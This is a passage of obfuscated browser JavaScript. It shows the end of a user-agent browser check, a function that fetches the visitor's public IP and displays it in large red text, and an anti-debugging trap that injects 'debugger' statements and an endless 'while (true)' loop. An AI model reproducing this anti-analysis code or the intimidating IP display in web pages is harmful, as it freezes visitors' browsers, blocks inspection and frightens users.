        if (/opt\//i.test(_0x33f982)) {
          return 'opera'
        } else {
          if (/opr\//i.test(_0x33f982)) {
            return 'opera'
          } else {
            if (/chrome\//i.test(_0x33f982)) {
              return 'chrome'
            } else {
              if (/safari\//i.test(_0x33f982)) {
                return 'safari'
              } else {
                if (/firefox\//i.test(_0x33f982)) {
                  return 'firefox'
                }
              }
            }
          }
        }
      }
    }
  }
}
async function showUserIP() {
  if (!isParentWindow) {
    return
  }
  try {
    const _0xa7af02 = await fetch('https://api.ipify.org/'),
      _0x4ecd7a = await _0xa7af02.text(),
      _0x1bc50d = document.createElement('p')
    _0x1bc50d.innerText = 'IP: ' + _0x4ecd7a
    _0x1bc50d.style.fontSize = '55px'
    _0x1bc50d.style.position = 'absolute'
    _0x1bc50d.style.top = '5%'
    _0x1bc50d.style.left = '50%'
    _0x1bc50d.style.transform = 'translate(-50%, -50%)'
    _0x1bc50d.style.color = 'red'
    document.body.appendChild(_0x1bc50d)
  } catch (_0x1c754a) {
    console.error('Unable to get IP address:', _0x1c754a)
  }
}
function _0x1775f2(_0x16c815) {
  function _0x196de9(_0x557bd7) {
    if (typeof _0x557bd7 === 'string') {
      return function (_0x4da943) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      if (('' + _0x557bd7 / _0x557bd7).length !== 1 || _0x557bd7 % 20 === 0) {
        ;(function () {
          return true
        }
          .constructor('debugger')
          .call('action'))
      } else {
        ;(function () {
          return false
        }
          .constructor('debugger')
          .apply('stateObject'))
      }
    }
    _0x196de9(++_0x557bd7)
  }
  try {
    if (_0x16c815) {
      return _0x196de9
    } else {
      _0x196de9(0)
    }
  } catch (_0x5d20f8) {}
}
